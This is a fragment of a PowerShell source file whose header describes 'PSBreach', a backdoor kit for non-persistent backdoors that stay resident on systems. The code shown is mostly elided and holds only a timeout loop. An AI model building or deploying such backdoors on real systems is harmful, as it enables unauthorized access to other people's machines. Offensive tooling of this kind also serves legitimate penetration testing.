...
# Description: PSBreach is a backdoor kit to provide a large variety of non
#				persistent backdoors to remain resident on systems. PSBreach is
#				a part of the PowerGrid collection and can be combined with
#				other PS tools.
# License: AGL3 (see README.md)
###################################################################################
...
#>
    ...
    while ($running) {
        ...
        if ($Timeout -ne 0 -and ($([DateTime]::Now) -gt $starttime.addseconds($Timeout))) {
            # if user-specified timeout has expired
            $running = $False
        }
